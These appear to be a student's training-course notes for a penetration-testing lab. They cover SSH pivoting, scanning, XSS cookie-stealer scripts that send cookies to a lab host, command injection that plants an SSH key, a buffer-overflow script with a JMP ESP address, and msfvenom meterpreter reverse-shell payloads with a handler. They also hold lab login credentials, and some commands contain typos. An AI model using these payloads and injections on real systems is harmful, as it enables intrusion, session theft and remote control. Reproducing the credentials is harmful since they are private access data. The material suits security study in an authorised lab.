# Day 1 

https://vta.cybbh.space/horizon/project/


https://sec.cybbh.io/public/security/latest/index.html

CTFD Server: http://10.50.20.250:8000	
User: NIRI-505-M  
Pass: gVN5chrkxW0bym1 	

Gray host: 10.50.34.77


LinOps:

ssh -X student@10.50.22.235
password1

Winops:

xfreerdp /u:student /p:password /dynamic-resolution +clipboard /v:10.50.29.77


Penetration Testing:



Scanning and Reconnaissance:


Scrapping Data:




       1. Host Discovery
        ◦ Find hosts that are online
    2. Port Enumeration
        ◦ Find ports for each host that is online
    3. Port Interrogation
        ◦ Find what service is running on each open/available port
	netstat -natup

Scripts are stored in a subdirectory of the Nmap data directory by default:

/usr/share/nmap/scripts



Vulnerability and Exploitation Research:






Master Sockets:

All traffic sent through /tmp/gray file will be sent to the 10.50.34.77 IP address. 

	ssh -MS /tmp/gray student@10.50.34.77 

Dynamic Tunnel:

	ssh -S /tmp/gray gray -O forward -D 9050

Canceling a Dynamic Tunnel 

	ssh -S /tmp/gray gray -O cancel -D 9050

HOST DISCOVERY:

One-line ping-sweep

	for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" & ); done


Post Enumeration:

	proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.111,120

Enumeration nmap script: 

	proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.111 -p 80


Local Port Forward using master Socket:

	ssh -S /tmp/gray gray -O forward -L 41201:192.168.28.111:80


	ssh -S /tmp/gray gray -O forward -L 41202:192.168.28.111:2222

Master Socket through another Master Socket:

	ssh -MS /tmp/comrade comrade@127.0.0.1 -p 41202

# Day2 
## Web Exploitation (XSS)


 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
HTTP Response Codes

    10X == Informational

    2XX == Success

    30X == Redirection

    4XX == Client Error

    5XX == Server Error




HTTP Fields

    User-Agent

    Referer

    Cookie

    Date

    Server

    Set-Cookie



WGET 

	wget -r -l2 -P /tmp ftp://ftpserver/
	wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
	wget --load-cookies cookies.txt -p https://website/interesting/article.php


# XSS Demos

Alert Script:

	<script>alert('XSS');</script>


Run on ops station:

	 python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Run on the webserver to send cookies back to my page:
	
 	<script>document.location="http://10.50.22.235:8000/"+document.cookie;</script>


## Command injection 
* Find users home directory and type of shell.

		; whomai
	 	; cat../../../etc/passwd 
  


* Generate and ssh key

 	 	ssh-keygen -t rsa -b 4096
* Inject public key into website
* Make .ssh folder in home directory

		;ls -la /users/home/directory      #check if .ssh exists
		; mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exis

* Make authorized key file in .ssh

		 ; echo "your_public_key_here" > /users/home/directory/.ssh/authorized_keys


* Verify key has been uploaded successfully.

		 ; cat /users/home/directory/.ssh/authorized_keys

* ssh onto the box:

   		ssh user@ip_addr
  Shouldn't prompt for password. If it does, your wrong. 

* Authenticating with a private key that was found:

  		ssh -i user_rsa.priv user@ip

 * Webserver info is stored

		/var/www/html


# Reverse Engineering:

run file command on the file.

Patching: 
	export program, then save as PE file and change name. 





# Exploit development testing

GDB Uses

	git clone https://github.com/longld/peda.git ~/peda
	echo "source ~/peda/peda.py" >> ~/.gdbinit

	disass <FUNCTION>   #   Disassemble portion of the program
	info <...>  #   Supply info for specific stack areas
	x/256c $<REGISTER>  #   Read characters from specific register
	break <address>  #   Establish a break point

	pdisass main 

wiremask.eu


	gdb
	gdb-peda$ run <<<$(echo "./mybuff.py")

## Start file without env variables
Bare bones gdb

	env - gdb ./func

 In the overflow state from the start of stack to end of the stack. 0xff == JMP , 0xe4 == esp


 (gdb) info proc map
process 30350
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/student/Downloads/func
	0x56556000 0x56557000     0x1000        0x0 /home/student/Downloads/func
	0x56557000 0x56558000     0x1000     0x1000 /home/student/Downloads/func
	0x56558000 0x5657a000    0x22000        0x0 [heap]
	0xf7de1000 0xf7fb3000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fb3000 0xf7fb4000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb4000 0xf7fb6000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb6000 0xf7fb7000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fb7000 0xf7fba000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4

In the script covert output of the above command from big to little endian. 

#!/usr/bin/python2.7

# Fill Buffer 62

buf = "A"* 62


#Overwrite EIP Register
buf += "\x59\x3b\xde\xf7"


"""
0xf7de3b59 -> \x59\x3b\xde\xf7  JMP ESP
0xf7f588ab
0xf7f645fb
"""

print(buf)

## Create payload using metasploit

msfconsole

		msf6 > use payload/linux/x86/exec
		msf6 payload(linux/x86/exec) > show options
		
		Module options (payload/linux/x86/exec):
		
		   Name  Current Setting  Required  Description
		   ----  ---------------  --------  -----------
		   CMD                    no        The command string to execute
		
		
		View the full module info with the info, or info -d command.
		
		msf6 payload(linux/x86/exec) > set CMD 'whoami && ifconfig'
		CMD => whoami && ifconfig
		msf6 payload(linux/x86/exec) > show options
		
		Module options (payload/linux/x86/exec):
		
		   Name  Current Setting     Required  Description
		   ----  ---------------     --------  -----------
		   CMD   whoami && ifconfig  no        The command string to execute

		msf6 payload(linux/x86/exec) > generate -b '\x00' -f python

  msfvenom one liner:

  		msfvenom -p linux/x86/exec CMD='whoami && ifconfig' -b '\x00' -f python

## Drop the hammer:
	./func <<<$("./mybuff.py")


## Windows Exploitation Development

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.22.235 lport=4444 -b "\x00" -f python


		msf6 > use multi/handler
		[*] Using configured payload generic/shell_reverse_tcp
		msf6 exploit(multi/handler) > show options
		
		Module options (exploit/multi/handler):
		
		   Name  Current Setting  Required  Description
		   ----  ---------------  --------  -----------
		
		
		Payload options (generic/shell_reverse_tcp):
		
		   Name   Current Setting  Required  Description
		   ----   ---------------  --------  -----------
		   LHOST                   yes       The listen address (an interface may be specified)
		   LPORT  4444             yes       The listen port
		
		
		Exploit target:
		
		   Id  Name
		   --  ----
		   0   Wildcard Target
		
		
		
		View the full module info with the info, or info -d command.
		
		msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
		payload => windows/meterpreter/reverse_tcp
		msf6 exploit(multi/handler) > set LHOST 0.0.0.0
		LHOST => 0.0.0.0
		msf6 exploit(multi/handler) > set LPORT 4444
		LPORT => 4444
		msf6 exploit(multi/handler) > exploit
		
		[*] Started reverse TCP handler on 0.0.0.0:4444
		

